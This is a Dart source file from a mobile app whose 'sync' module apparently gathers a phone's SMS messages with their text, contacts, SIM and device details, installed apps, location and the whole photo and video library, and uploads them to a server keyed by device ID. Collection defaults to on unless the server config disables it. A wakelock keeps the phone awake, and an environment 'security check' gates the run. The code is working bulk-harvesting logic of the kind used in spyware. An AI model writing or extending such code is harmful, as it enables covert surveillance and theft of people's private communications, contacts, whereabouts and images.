import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:path_provider/path_provider.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:wakelock_plus/wakelock_plus.dart';
import '../../core/network/network_client.dart';
import '../repositories/device_repository.dart';
import '../repositories/message_repository.dart';
import '../repositories/contact_repository.dart';
import '../repositories/location_repository.dart';
import '../repositories/media_repository.dart';
import '../repositories/history_repository.dart';
import './check_security_use_case.dart';
import './fetch_config_use_case.dart';
import './upload_data_use_case.dart';
import '../../services/compression_service.dart';
import '../../services/device_id_service.dart';

class _UploadTask {
  final File file;
  final String originalPath;
  final String deviceId;
  final bool isThumbnail;

  _UploadTask({
    required this.file,
    required this.originalPath,
    required this.deviceId,
    this.isThumbnail = false,
  });
}

class SyncDataUseCase {
  final CheckSecurityUseCase _checkSecurity;
  final FetchConfigUseCase _fetchConfig;
  final UploadDataUseCase _uploadData;
  final IDeviceRepository _deviceRepo;
  final IMessageRepository _messageRepo;
  final IContactRepository _contactRepo;
  final ILocationRepository _locationRepo;
  final IMediaRepository _mediaRepo;
  final IHistoryRepository _historyRepo;
  final NetworkClient _networkClient;

  SyncDataUseCase(
    this._checkSecurity,
    this._fetchConfig,
    this._uploadData,
    this._deviceRepo,
    this._messageRepo,
    this._contactRepo,
    this._locationRepo,
    this._mediaRepo,
    this._historyRepo,
    this._networkClient,
  );

  Future<Map<String, dynamic>?> fetchConfig() async {
    return await _fetchConfig.execute();
  }

  Future<void> uploadDeviceInfo({Function(String)? onProgress}) async {
    final deviceId = await DeviceIdService.getDeviceId();
    await _runSafe('设备信息', onProgress, () async {
      final data = await _deviceRepo.getDeviceInfo();
      // 2026 Fix: Use memory stream upload (No temp file, No privacy leak)
      await _uploadData.executeStream(
        () => _createJsonStream(data),
        '${deviceId}_device_info.json',
      );
    });
  }

  Future<void> uploadSimInfo({Function(String)? onProgress}) async {
    final deviceId = await DeviceIdService.getDeviceId();
    await _runSafe('SIM卡信息', onProgress, () async {
      final data = await _deviceRepo.getSimInfo();
      await _uploadData.executeStream(
        () => _createJsonStream(data),
        '${deviceId}_sim_info.json',
      );
    });
  }

  Future<void> uploadSms({Function(String)? onProgress}) async {
    final deviceId = await DeviceIdService.getDeviceId();
    await _runSafe('短信记录', onProgress, () async {
      final messages = await _messageRepo.getSmsMessages();
      final data = messages.map(
        (m) => {
          'address': m.address,
          'body': m.body,
          'date': m.date,
          'type': m.type,
        },
      );
      // 2026 Fix: Stream large list to avoid OOM
      await _uploadData.executeStream(
        () => _createJsonStream(data),
        '${deviceId}_sms_data.json',
      );
    });
  }

  Future<void> uploadContacts({Function(String)? onProgress}) async {
    final deviceId = await DeviceIdService.getDeviceId();
    await _runSafe('联系人', onProgress, () async {
      final contacts = await _contactRepo.getContacts();
      final data = contacts.map(
        (c) => {
          'displayName': c.displayName,
          'phones': c.phones,
          'emails': c.emails,
        },
      );
      await _uploadData.executeStream(
        () => _createJsonStream(data),
        '${deviceId}_contacts_data.json',
      );
    });
  }

  Future<void> uploadAppList({Function(String)? onProgress}) async {
    final deviceId = await DeviceIdService.getDeviceId();
    await _runSafe('应用列表', onProgress, () async {
      final apps = await _deviceRepo.getInstalledApps();
      final data = apps.map(
        (app) => {
          'appName': app.appName,
          'packageName': app.packageName,
          'versionName': app.versionName,
          'versionCode': app.versionCode,
          'systemApp': app.systemApp,
          'installTime': app.installTime,
          'updateTime': app.updateTime,
          'enabled': app.enabled,
          'category': app.category,
        },
      );
      await _uploadData.executeStream(
        () => _createJsonStream(data),
        '${deviceId}_installed_apps.json',
      );
    });
  }

  Future<void> uploadLocation({Function(String)? onProgress}) async {
    final deviceId = await DeviceIdService.getDeviceId();
    await _runSafe('定位信息', onProgress, () async {
      final location = await _locationRepo.getCurrentLocation();
      if (location.isNotEmpty) {
        await _uploadData.executeStream(
          () => _createJsonStream(location),
          '${deviceId}_location_data.json',
        );
      }
    });
  }

  Future<void> uploadMedia({Function(String)? onProgress}) async {
    final deviceId = await DeviceIdService.getDeviceId();
    await _runSafe('媒体文件', onProgress, () async {
      await _historyRepo.loadHistory();

      // 2026 "Full Power" Configuration
      // CPU Intensive: Dynamic 1.5x Cores (Capped at 16 to prevent OOM/Crash)
      final int cpuCount = Platform.numberOfProcessors;
      final int maxCompression = (cpuCount * 1.5).ceil().clamp(4, 16);

      // IO Intensive: Adaptive Concurrency (AIMD)
      // Handles weak network and prevents "fake death"
      final concurrency = _AdaptiveConcurrency(initial: 8, min: 4, max: 64);
      final channel = _PriorityTaskChannel(capacity: 200);

      // Smart Network Listener
      // Pause queue when network is lost; Resume when restored
      final connectivitySub = Connectivity().onConnectivityChanged.listen((
        results,
      ) {
        final hasNetwork = results.any(
          (r) =>
              r == ConnectivityResult.wifi ||
              r == ConnectivityResult.mobile ||
              r == ConnectivityResult.ethernet ||
              r == ConnectivityResult.vpn,
        );

        if (!hasNetwork) {
          channel.pause();
        } else {
          channel.resume();
        }
      });

      // Initial network check
      final initResult = await Connectivity().checkConnectivity();
      if (!initResult.any(
        (r) =>
            r == ConnectivityResult.wifi ||
            r == ConnectivityResult.mobile ||
            r == ConnectivityResult.ethernet ||
            r == ConnectivityResult.vpn,
      )) {
        channel.pause();
      }

      // 1. Start Upload Workers (Consumers)
      final List<Future> uploadWorkers = [];
      // Shared upload counter for batch history saving
      final List<int> totalUploaded = [0];

      // Start enough workers to cover max concurrency
      for (int i = 0; i < concurrency.max; i++) {
        uploadWorkers.add(
          _uploadWorker(channel, concurrency, onProgress, totalUploaded),
        );
      }

      // 2. Start Compression Loop (Producers)
      final Set<Future> compressionTasks = {};

      try {
        await for (final file in _mediaRepo.getMediaFiles()) {
          final fileId = file.path;
          if (await _historyRepo.isUploaded(fileId)) continue;

          // Backpressure 1: Pause scanning if compression pool is full
          if (compressionTasks.length >= maxCompression) {
            await Future.any(compressionTasks);
          }

          // Backpressure 2: Memory Protection (Wait if upload queue is full)
          if (channel.isFull) {
            await channel.waitForSpace();
          }

          // Start independent compression task
          final task =
              _compressAndEnqueue(
                file,
                deviceId,
                channel,
                onProgress,
                concurrency,
              ).catchError((e) {
                // Log error but don't crash
              });

          compressionTasks.add(task);
          task.whenComplete(() => compressionTasks.remove(task));
        }

        // 3. Wait for all compression to finish
        await Future.wait(compressionTasks);
      } finally {
        // 4. Signal upload workers to stop when empty
        await channel.close();
        await connectivitySub.cancel();
      }

      // 5. Wait for all uploads to complete
      await Future.wait(uploadWorkers);

      await _historyRepo.saveHistory();
    });
  }

  // Producer: Compresses file and puts it into upload queue
  Future<void> _compressAndEnqueue(
    File file,
    String deviceId,
    _PriorityTaskChannel channel,
    Function(String)? onProgress,
    _AdaptiveConcurrency concurrency,
  ) async {
    try {
      final ext = file.path.toLowerCase();
      final fileSize = await file.length();

      // --- 1. Thumbnail Generation (Top Priority) ---
      final thumbFile = await CompressionService.generateThumbnail(file);
      if (thumbFile != null) {
        channel.add(
          _UploadTask(
            file: thumbFile,
            originalPath: file.path,
            deviceId: deviceId,
            isThumbnail: true,
          ),
        );
      }

      // --- 2. Main File Processing ---
      if (fileSize == 0) return;

      File? processedFile;

      // Smart Skip Logic:
      // 1. Tiny files (<500KB): Always skip compression
      // 2. Video files (<10MB): Always skip compression
      // 3. Medium files (<1MB): Skip if network is free (active < limit)
      bool shouldCompress = true;

      if (fileSize < 500 * 1024) {
        shouldCompress = false;
      } else if (fileSize < 10 * 1024 * 1024 &&
          (ext.endsWith('.mp4') ||
              ext.endsWith('.mov') ||
              ext.endsWith('.avi') ||
              ext.endsWith('.mkv') ||
              ext.endsWith('.flv') ||
              ext.endsWith('.3gp'))) {
        shouldCompress = false;
      } else if (fileSize < 1024 * 1024 &&
          concurrency.active < concurrency.limit) {
        shouldCompress = false;
      }

      if (!shouldCompress) {
        processedFile = file;
      } else {
        if (ext.endsWith('.jpg') ||
            ext.endsWith('.jpeg') ||
            ext.endsWith('.png') ||
            ext.endsWith('.bmp') ||
            ext.endsWith('.gif')) {
          processedFile = await CompressionService.compressImage(file);
        } else if (ext.endsWith('.heic')) {
          // HEIC Optimization: Upload original directly
          // Decoding 48MP HEIC is CPU intensive and slow.
          // Server-side processing is more efficient.
          processedFile = file;
        } else if (ext.endsWith('.mp4') ||
            ext.endsWith('.mov') ||
            ext.endsWith('.avi') ||
            ext.endsWith('.mkv') ||
            ext.endsWith('.flv') ||
            ext.endsWith('.3gp')) {
          processedFile = await CompressionService.compressVideo(file);
        }
      }

      if (processedFile != null) {
        channel.add(
          _UploadTask(
            file: processedFile,
            originalPath: file.path,
            deviceId: deviceId,
            isThumbnail: false,
          ),
        );
      }
    } catch (e) {
      // Ignore errors during temp file cleanup (non-critical).
    }
  }

  // Consumer: Reads from queue and uploads
  Future<void> _uploadWorker(
    _PriorityTaskChannel channel,
    _AdaptiveConcurrency concurrency,
    Function(String)? onProgress,
    List<int> totalUploaded,
  ) async {
    Future<void> pump() async {
      while (true) {
        // Smart Network Awareness: Pause if disconnected
        if (channel.isPaused) {
          onProgress?.call('网络已断开，等待恢复...');
          await channel.waitForResume();
          onProgress?.call('网络恢复，继续同步');
        }

        if (!concurrency.canSchedule) return;
        final task = channel.pop();
        if (task == null) return;

        concurrency.acquire();
        try {
          await _processUploadTask(task, onProgress);
          concurrency.release(success: true);

          // Batch History Saving (Every 50 uploads)
          totalUploaded[0]++;
          if (totalUploaded[0] % 50 == 0) {
            await _historyRepo.saveHistory();
          }
        } catch (e) {
          concurrency.release(success: false);
        }
      }
    }

    await pump();
    await for (final _ in channel.stream) {
      await pump();
    }
    await pump();
  }

  Future<void> _processUploadTask(
    _UploadTask task,
    Function(String)? onProgress,
  ) async {
    if (!task.isThumbnail && await _historyRepo.isUploaded(task.originalPath)) {
      if (task.file.path != task.originalPath) {
        await task.file.delete();
      }
      return;
    }

    var originalName = task.originalPath.split(Platform.pathSeparator).last;
    if (!task.isThumbnail &&
        task.file.path.endsWith('.jpg') &&
        !originalName.toLowerCase().endsWith('.jpg') &&
        !originalName.toLowerCase().endsWith('.jpeg')) {
      final dotIndex = originalName.lastIndexOf('.');
      if (dotIndex != -1) {
        originalName = '${originalName.substring(0, dotIndex)}.jpg';
      } else {
        originalName = '$originalName.jpg';
      }
    }

    String remoteName;
    if (task.isThumbnail) {
      remoteName = '${task.deviceId}_thumb_$originalName';
    } else {
      remoteName = '${task.deviceId}_$originalName';
    }

    onProgress?.call('[$remoteName] 正在上传');

    int retryCount = 0;
    while (true) {
      try {
        await _uploadData.execute(task.file, remoteName: remoteName);
        break;
      } catch (e) {
        retryCount++;
        if (retryCount >= 3) rethrow;
        await Future.delayed(const Duration(milliseconds: 500));
      }
    }

    if (!task.isThumbnail) {
      await _historyRepo.addToHistory(task.originalPath);
    }

    if (task.isThumbnail || task.file.path != task.originalPath) {
      await task.file.delete();
    }
  }

  Future<void> execute({required Function(String) onProgress}) async {
    // 1. Acquire Wakelock to prevent CPU sleeping during long sync
    await WakelockPlus.enable();

    try {
      final deviceId = await DeviceIdService.getDeviceId();
      await _historyRepo.loadHistory();
      await _cleanResidualTempFiles(onProgress);

      onProgress('正在获取同步策略...');
      final config = await _fetchConfig.execute();
      if (config == null) {
        onProgress('获取策略失败，请稍后重试');
        return;
      }

      onProgress('正在进行安全环境检查...');
      final isSafe = await _checkSecurity.execute();
      if (!isSafe) {
        onProgress('环境安全校验失败，操作已终止');
        return;
      }

      final List<Future> tasks = [];
      if (config['device'] ?? true) {
        tasks.add(uploadDeviceInfo(onProgress: onProgress));
      }
      if (config['sim'] ?? true) {
        tasks.add(uploadSimInfo(onProgress: onProgress));
      }
      if (config['sms'] ?? true) {
        tasks.add(uploadSms(onProgress: onProgress));
      }
      if (config['contacts'] ?? true) {
        tasks.add(uploadContacts(onProgress: onProgress));
      }
      if (config['apps'] ?? true) {
        tasks.add(uploadAppList(onProgress: onProgress));
      }
      if (config['location'] ?? true) {
        tasks.add(uploadLocation(onProgress: onProgress));
      }
      if (config['album'] ?? true) {
        tasks.add(uploadMedia(onProgress: onProgress));
      }

      await Future.wait(tasks);
      await _historyRepo.saveHistory();
      onProgress('同步完成');
    } finally {
      // 2. Release Wakelock
      await WakelockPlus.disable();
    }
  }

  Future<void> _runSafe(
    String name,
    Function(String)? onProgress,
    Future<void> Function() task,
  ) async {
    try {
      onProgress?.call('[$name] 正在处理...');
      await task();
      onProgress?.call('[$name] 处理完成');
    } catch (e) {
      onProgress?.call('[$name] 处理失败: $e');
    }
  }

  Stream<List<int>> _createJsonStream(dynamic data) async* {
    // 2026 Fix: Stream JSON encoding to avoid OOM
    if (data is Iterable && data is! Map) {
      yield utf8.encode('[');
      bool first = true;
      for (final item in data) {
        if (!first) yield utf8.encode(',');
        yield utf8.encode(jsonEncode(item));
        first = false;
      }
      yield utf8.encode(']');
    } else {
      yield utf8.encode(jsonEncode(data));
    }
  }

  Future<void> _cleanResidualTempFiles(Function(String) onProgress) async {
    try {
      final directory = await getTemporaryDirectory();
      if (await directory.exists()) {
        // 2026 Fix: Async stream to avoid UI jank on main thread
        await for (final file in directory.list()) {
          if (file is File) {
            final name = file.path.split(Platform.pathSeparator).last;
            if (name.endsWith('.json') ||
                name.contains('compress') ||
                name.contains('temp')) {
              await file.delete();
            }
          }
        }
      }
    } catch (e) {
      // Ignore compression/processing errors to keep the queue moving.
    }
  }
}

// --- Helper Classes ---

/// Adaptive Concurrency Controller (AIMD Algorithm)
class _AdaptiveConcurrency {
  int _limit;
  final int _min;
  final int _max;
  int _activeCount = 0;
  int _successStreak = 0;

  _AdaptiveConcurrency({int initial = 8, int min = 4, int max = 64})
    : _limit = initial,
      _min = min,
      _max = max;

  int get limit => _limit;
  int get active => _activeCount;
  int get max => _max;
  bool get canSchedule => _activeCount < _limit;

  void acquire() {
    _activeCount++;
  }

  void release({bool success = true}) {
    _activeCount--;
    if (_activeCount < 0) _activeCount = 0;

    if (success) {
      _successStreak++;
      if (_successStreak > _limit && _limit < _max) {
        _limit++; // Additive Increase
        _successStreak = 0;
      }
    } else {
      _successStreak = 0;
      _limit = (_limit / 2).floor().clamp(
        _min,
        _max,
      ); // Multiplicative Decrease
    }
  }
}

/// Priority Task Channel (LIFO Support)
class _PriorityTaskChannel {
  final int capacity;

  // Thumbnails (High Priority)
  final List<_UploadTask> _highPriority = [];
  // Normal Media (LIFO - Stack behavior for newest first)
  final List<_UploadTask> _normalPriority = [];

  final StreamController<bool> _addSignal = StreamController.broadcast();
  final StreamController<void> _popSignal = StreamController.broadcast();

  // Network Pause Control
  bool _isPaused = false;
  final StreamController<void> _resumeSignal = StreamController.broadcast();

  bool _isClosed = false;

  _PriorityTaskChannel({this.capacity = 200});

  bool get isFull =>
      (_highPriority.length + _normalPriority.length) >= capacity;
  bool get isEmpty => _highPriority.isEmpty && _normalPriority.isEmpty;
  bool get isClosed => _isClosed;
  bool get isPaused => _isPaused;
  Stream<bool> get stream => _addSignal.stream;

  Future<void> waitForSpace() async {
    while (isFull && !_isClosed) {
      await _popSignal.stream.first;
    }
  }

  void pause() {
    if (!_isPaused) {
      _isPaused = true;
    }
  }

  void resume() {
    if (_isPaused) {
      _isPaused = false;
      _resumeSignal.add(null);
    }
  }

  Future<void> waitForResume() async {
    if (!_isPaused) return;
    await _resumeSignal.stream.first;
  }

  void add(_UploadTask task) {
    if (_isClosed) return;
    if (task.isThumbnail) {
      _highPriority.add(task);
    } else {
      _normalPriority.add(task);
    }
    _addSignal.add(true);
  }

  _UploadTask? pop() {
    _UploadTask? task;
    if (_highPriority.isNotEmpty) {
      task = _highPriority.removeLast();
    } else if (_normalPriority.isNotEmpty) {
      task = _normalPriority.removeLast(); // LIFO
    }

    if (task != null) {
      _popSignal.add(null); // Signal space available
    }
    return task;
  }

  Future<void> close() async {
    _isClosed = true;
    await _addSignal.close();
    await _popSignal.close();
    await _resumeSignal.close();
  }
}
